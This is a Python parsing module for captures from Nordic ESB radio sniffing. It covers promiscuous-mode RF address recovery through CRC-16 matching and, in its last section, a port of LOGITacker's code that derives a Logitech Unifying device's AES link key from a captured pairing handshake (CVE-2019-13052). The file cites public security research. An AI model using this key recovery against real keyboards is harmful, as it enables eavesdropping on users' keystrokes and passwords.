"""cli_esb - host-side parsing of captures from the `esb` standalone mode.

Pure functions, no device access. Frames are raw ESB payloads (the radio's own
16-bit CRC already stripped); nothing about the higher-layer protocol is
assumed beyond what's documented for Logitech Unifying specifically. Anything
not understood is reported as-is (raw hex) rather than guessed.
"""

import struct

# Logitech Unifying payload shapes, from Bastille Research's MouseJack
# disclosure and SensePost's Logitacker writeup: 5, 10 or 22-byte payload,
# plus a 1-byte vendor checksum on top of ESB's own CRC -- so 6, 11 or 23
# bytes as captured here. What each shape actually carries (HID++ short vs.
# long report, encrypted keyboard frame, etc.) is Logitacker-specific
# protocol detail that hasn't been looked into yet; this only reports shape,
# checksum validity and raw bytes.
UNIFYING_LENS = {6: "short(5)", 11: "short(10)", 23: "long(22)"}


def parse_records(blob: bytes):
    """Split the firmware log into (channel, frame) tuples. Stops at a truncated record."""
    out, i = [], 0
    while i + 2 <= len(blob):
        ch, ln = blob[i], blob[i + 1]
        if i + 2 + ln > len(blob):
            break
        out.append((ch, bytes(blob[i + 2:i + 2 + ln])))
        i += 2 + ln
    return out


def unifying_checksum_ok(f: bytes) -> bool:
    """Logitech Unifying's documented vendor checksum: byte-wise sum of the
    whole frame (payload + checksum byte) is 0 mod 256. Documented in the
    Bastille/MouseJack and Logitacker write-ups; not Nordic/ESB's own CRC,
    which the radio has already checked and stripped before this."""
    if not f:
        return False
    return (sum(f) & 0xFF) == 0


def describe_frame(ch: int, f: bytes) -> str:
    shape = UNIFYING_LENS.get(len(f), f"len={len(f)}")
    ok = "ok" if unifying_checksum_ok(f) else "BAD"
    return f"ch={ch:3d} {shape:<10s} checksum={ok}  {f.hex()}"


def summarize(recs) -> str:
    if not recs:
        return "no frames"
    by_shape = {}
    for _ch, f in recs:
        shape = UNIFYING_LENS.get(len(f), f"len={len(f)}")
        by_shape[shape] = by_shape.get(shape, 0) + 1
    parts = ", ".join(f"{n} {s}" for s, n in sorted(by_shape.items()))
    return f"{len(recs)} frame(s): {parts}"


# --- esb-promisc: brute-force partial-address captures -------------------
#
# Every record here is a CANDIDATE, not a confirmed frame -- the firmware
# runs with CRC off (there's nothing to validate an unknown address
# against), so isolated hits on noise are expected. See
# esb_promisc_radio.h/mode_esb_promisc.c for exactly what's grounded
# (the BALEN-shrink partial-match technique, confirmed on this RADIO
# family for BLE) vs. unverified (that it ports to ESB/Unifying, and the
# exact byte order of the leaked remainder). This module does NOT attempt
# address reconstruction -- that needs a real capture to pin the byte
# order down first; it only groups and dumps candidates so that can be
# done by hand against a capture with a partially-known address.

def parse_promisc_records(blob: bytes):
    """Split the firmware log into (channel, prefix_guess, base_guess, raw) tuples."""
    out, i = [], 0
    while i + 4 <= len(blob):
        ch, prefix, base, ln = blob[i], blob[i + 1], blob[i + 2], blob[i + 3]
        if i + 4 + ln > len(blob):
            break
        out.append((ch, prefix, base, bytes(blob[i + 4:i + 4 + ln])))
        i += 4 + ln
    return out


def describe_promisc_hit(ch: int, prefix: int, base: int, raw: bytes) -> str:
    line = f"ch={ch:3d} prefix={prefix:#04x} base={base:#04x}  {raw.hex()}"
    c = esb_crc_best(prefix, base, raw)
    if c is None:
        return line + "  crc:noise"
    dev = f"{c['device']:#04x}" if c['device'] is not None else "-"
    tag = (f"CRC-OK({c['bitorder']}) addr={c['address'].hex().upper()} "
           f"dev={dev} {esb_classify(c['payload'])} pl={c['payload_len']} pay={c['payload'].hex()}")
    if c['unifying']:
        tag += f" unifying {UNIFYING_LENS[c['payload_len']]} cksum={'ok' if c['cksum_ok'] else 'BAD'}"
    return line + "  " + tag


# RF/DJ report-type byte (payload[1]) -> name. From Logitech's Unifying DJ
# collection spec (the RF Report Type field) plus the Linux hid-logitech-dj
# driver and lekensteyn/ltunify for the notification range. Bytes not listed
# (incl. the RF-link keepalive/pairing/encrypted-keystroke types, which aren't
# pinned by a public name=value) are shown raw rather than guessed.
_RF_REPORT_TYPES = {
    0x01: "keyboard", 0x02: "mouse", 0x03: "consumer-ctl", 0x04: "system-ctl",
    0x08: "media-center", 0x0E: "kbd-leds", 0x10: "hidpp-short", 0x11: "hidpp-long",
    0x40: "notif-unpaired", 0x41: "notif-paired", 0x42: "notif-conn-status",
    0x4A: "notif-lock-changed", 0x4B: "notif-pair-accepted?", 0x7F: "notif-error",
}


def esb_classify(payload: bytes) -> str:
    """Best-effort Unifying RF frame label. Names are the documented RF/DJ
    report types keyed on payload[1]; a 22-byte payload is the encrypted-
    keyboard shape (Bastille). Unknown type bytes are shown raw."""
    if len(payload) < 2:
        return "short"
    rt = payload[1]
    name = _RF_REPORT_TYPES.get(rt, f"type=0x{rt:02x}")
    if len(payload) == 23:
        name += " [encrypted-kbd shape]"
    return name


def promisc_addresses(recs):
    """Distinct RF addresses recovered from the CRC-valid hits, each with its
    seen device indices and hit count. These can be handed straight to the
    known-address `esb` mode (standalone config esb --address <addr>)."""
    found = {}
    for ch, p, b, raw in recs:
        c = esb_crc_best(p, b, raw)
        if c is None:
            continue
        a = c['address'].hex().upper()
        e = found.setdefault(a, {'count': 0, 'devices': set(), 'unifying': False})
        e['count'] += 1
        if c['device'] is not None:
            e['devices'].add(c['device'])
        e['unifying'] = e['unifying'] or c['unifying']
    return found


def promisc_hit_counts(recs):
    """(prefix, base) -> hit count. A guess with many hits is a real
    candidate; a guess with one or two is likely noise (CRC is off)."""
    counts = {}
    for _ch, prefix, base, _raw in recs:
        counts[(prefix, base)] = counts.get((prefix, base), 0) + 1
    return counts


def summarize_promisc(recs) -> str:
    if not recs:
        return "no hits"
    counts = promisc_hit_counts(recs)
    top = sorted(counts.items(), key=lambda kv: kv[1], reverse=True)[:5]
    top_str = ", ".join(f"prefix={p:#04x}/base={b:#04x}:{n}" for (p, b), n in top)
    valid = sum(1 for ch, p, b, raw in recs if esb_crc_best(p, b, raw))
    unif = sum(1 for ch, p, b, raw in recs
               if (c := esb_crc_best(p, b, raw)) and c['unifying'])
    head = f"{len(recs)} hit(s) across {len(counts)} guess(es)"
    if not valid:
        return f"{head}; 0 CRC-valid (all noise so far); top: {top_str}"
    addrs = promisc_addresses(recs)
    addr_str = "; ".join(
        f"{a} (x{d['count']}" + (f", dev {','.join(f'{x:#04x}' for x in sorted(d['devices']))}" if d['devices'] else "") + ")"
        for a, d in sorted(addrs.items(), key=lambda kv: kv[1]['count'], reverse=True))
    return (f"{head}; {valid} CRC-valid ({unif} Unifying) -- real frames. "
            f"Addresses: {addr_str}. Feed one to: standalone config esb --address <addr>")


# --- ESB CRC-16 validation of promisc captures ---------------------------
#
# A promisc hit is raw bits with CRC off (see esb_promisc_radio.h), so real
# frames and noise matches look alike. nRF24/Nordic ESB appends a 2-byte
# CRC-16/CCITT-FALSE (poly 0x1021, init 0xFFFF) computed MSB-first over the
# contiguous on-air bitstream {address, 9-bit PCF, payload}. Preamble-sync
# captures begin at that address, so sliding the CRC boundary over the raw bits
# and checking for a match tells a real frame from noise -- a false match is
# ~1/65536 per boundary -- and the leading addr_bytes of the matching bitstream
# are the real RF address. The nRF52 stores bits LSBit-first, so the 'lsb'
# (bit-reversed) pass is the one that validates on real hardware.

def _bits_msb(data: bytes):
    out = []
    for byte in data:
        for i in range(7, -1, -1):
            out.append((byte >> i) & 1)
    return out


def _crc16_ccitt(bits) -> int:
    crc = 0xFFFF
    for b in bits:
        crc ^= (b & 1) << 15
        crc = ((crc << 1) ^ 0x1021) & 0xFFFF if (crc & 0x8000) else (crc << 1) & 0xFFFF
    return crc


def _bits_to_int(bits) -> int:
    v = 0
    for b in bits:
        v = (v << 1) | b
    return v


def _rev_byte(x: int) -> int:
    return int(f"{x & 0xFF:08b}"[::-1], 2)


def esb_crc_candidates(prefix: int, base: int, raw: bytes, addr_bytes: int = 5,
                       max_payload: int = 23):
    """CRC-valid ESB framings in one promisc hit. The preamble-sync capture
    begins at the real address, so the bytes are validated as-is -- nothing is
    prepended. Fixes the address at addr_bytes (5 for Unifying); a 3/4-byte-
    address frame still validates, just read as a longer payload. The nRF52
    RADIO stores payload bits LSBit-first, the reverse of the nRF24 on-air
    order the CRC is computed over, so the bytes are tried as captured (msb)
    and bit-reversed (lsb). For each, slides the 2-byte CRC boundary over
    payload lengths and keeps the ones where CRC-16 over the leading bits
    equals the next 16. Shortest payload first; the 'bitorder' tag pins the
    real layout once a frame validates. (prefix/base are the preamble marker,
    not address bytes, so they are not used in the reconstruction.)"""
    out = []
    hdr = addr_bytes * 8 + 9          # address + 9-bit PCF, before payload
    raw = bytes(raw)
    raw_rev = bytes(_rev_byte(x) for x in raw)
    for bitorder, body in (("msb", raw), ("lsb", raw_rev)):
        bits = _bits_msb(body)
        n = len(bits)
        for plen in range(0, max_payload + 1):
            k = hdr + 8 * plen
            if k + 16 > n:
                break
            if _crc16_ccitt(bits[:k]) == _bits_to_int(bits[k:k + 16]):
                address = bytes(_bits_to_int(bits[8 * i:8 * i + 8]) for i in range(addr_bytes))
                payload = bytes(_bits_to_int(bits[hdr + 8 * i:hdr + 8 * i + 8]) for i in range(plen))
                out.append({
                    'order': "none",
                    'bitorder': bitorder,
                    'address': address,            # 5-byte RF address, reconstructed in the matching bit order
                    'device': payload[0] if payload else None,   # Unifying device index (HID++ byte 0)
                    'payload_len': plen,
                    'payload': payload,
                    'crc': _bits_to_int(bits[k:k + 16]),
                    'unifying': plen in UNIFYING_LENS,
                    'cksum_ok': plen in UNIFYING_LENS and unifying_checksum_ok(payload),
                })
    out.sort(key=lambda c: (c['payload_len'], c['bitorder'] != "msb"))
    return out


def esb_crc_best(prefix: int, base: int, raw: bytes):
    """Best CRC-valid framing for a hit, or None. Prefers a Unifying-shaped
    payload whose vendor checksum also passes, else the shortest valid one."""
    cands = esb_crc_candidates(prefix, base, raw)
    if not cands:
        return None
    for c in cands:
        if c['cksum_ok']:
            return c
    for c in cands:
        if c['unifying']:
            return c
    return cands[0]


# --- Unifying pairing capture -> AES link-key derivation (CVE-2019-13052) ---
#
# Ported from LOGITacker (RoganDawes/LOGITacker, logitacker_pairing_parser.c).
# A Unifying pairing is a cleartext RF handshake; capturing it recovers the
# per-device AES-128 link key, which then decrypts keyboard traffic. Frames
# here are ESB payloads (byte 0 = device index, byte 1 = report type), the same
# payloads esb_crc_candidates yields. The device uses the global pairing
# address BB:0A:DC:A5:75 during the exchange.
UNIFYING_GLOBAL_PAIRING_ADDRESS = bytes([0xBB, 0x0A, 0xDC, 0xA5, 0x75])


def classify_pairing_frame(payload: bytes):
    """Pairing phase of one ESB payload, or None. Length + report-type (byte 1)
    + phase (byte 2), exactly as LOGITacker's classify_frame."""
    n = len(payload)
    if n == 22 and payload[1] in (0x5f, 0xdf):                 # device -> dongle request
        return {0x01: "req1", 0x02: "req2", 0x03: "req3"}.get(payload[2])
    if n == 22 and payload[1] == 0x1f:                         # dongle -> device response
        return {0x01: "rsp1", 0x02: "rsp2"}.get(payload[2])
    if n == 10 and payload[1] == 0x0f:
        return "rsp_final"
    return None


class UnifyingPairing:
    """Accumulates pairing frames and derives the AES link key. Feed each
    captured ESB payload to ingest(); once req1/req2/rsp1/rsp2 are in,
    key_material_complete() is true and device_key() returns the 16-byte key."""

    def __init__(self):
        self.f = {}
        self.seen = set()

    def ingest(self, payload: bytes):
        payload = bytes(payload)
        cls = classify_pairing_frame(payload)
        if cls == "req1":                                      # device WPID, type, caps
            self.f["device_wpid"] = payload[9:11]
            self.f["device_type"] = payload[13]
            self.f["device_caps"] = payload[14]
        elif cls == "req2":                                    # device nonce, serial
            self.f["device_nonce"] = payload[3:7]
            self.f["device_serial"] = payload[7:11]
        elif cls == "req3":                                    # device name
            nl = min(payload[4], 16)
            self.f["device_name"] = payload[5:5 + nl]
        elif cls == "rsp1":                                    # dongle WPID, assigned RF address
            self.f["dongle_wpid"] = payload[9:11]
            self.f["device_rf_address"] = payload[3:8]
        elif cls == "rsp2":                                    # dongle nonce
            self.f["dongle_nonce"] = payload[3:7]
        elif cls != "rsp_final":
            return None
        self.seen.add(cls)
        return cls

    def key_material_complete(self) -> bool:
        return {"req1", "req2", "rsp1", "rsp2"} <= self.seen

    def raw_key_material(self) -> bytes:
        f = self.f
        return (bytes(f["device_rf_address"][:4]) + bytes(f["device_wpid"]) +
                bytes(f["dongle_wpid"]) + bytes(f["device_nonce"]) + bytes(f["dongle_nonce"]))

    def device_key(self) -> bytes:
        r = self.raw_key_material()
        k = bytearray(16)
        k[2] = r[0]
        k[1] = r[1] ^ 0xFF
        k[5] = r[2] ^ 0xFF
        k[3] = r[3]
        k[14] = r[4]
        k[11] = r[5]
        k[9] = r[6]
        k[0] = r[7]
        k[8] = r[8]
        k[6] = r[9] ^ 0x55
        k[4] = r[10]
        k[15] = r[11]
        k[10] = r[12] ^ 0xFF
        k[12] = r[13]
        k[7] = r[14]
        k[13] = r[15] ^ 0x55
        return bytes(k)


def unifying_pairing_key(payloads):
    """Parse a captured pairing (iterable of ESB payloads) and return the
    recovered key, or None if the key-material frames weren't all captured."""
    p = UnifyingPairing()
    for pl in payloads:
        p.ingest(pl)
    if not p.key_material_complete():
        return None
    name = p.f.get("device_name", b"")
    return {
        "address": p.f["device_rf_address"],
        "raw_key_material": p.raw_key_material(),
        "device_key": p.device_key(),
        "device_wpid": p.f["device_wpid"],
        "dongle_wpid": p.f["dongle_wpid"],
        "device_name": name.decode("latin1", "replace") if name else "",
        "full_pairing": {"req1", "req2", "req3", "rsp1", "rsp2", "rsp_final"} <= p.seen,
    }
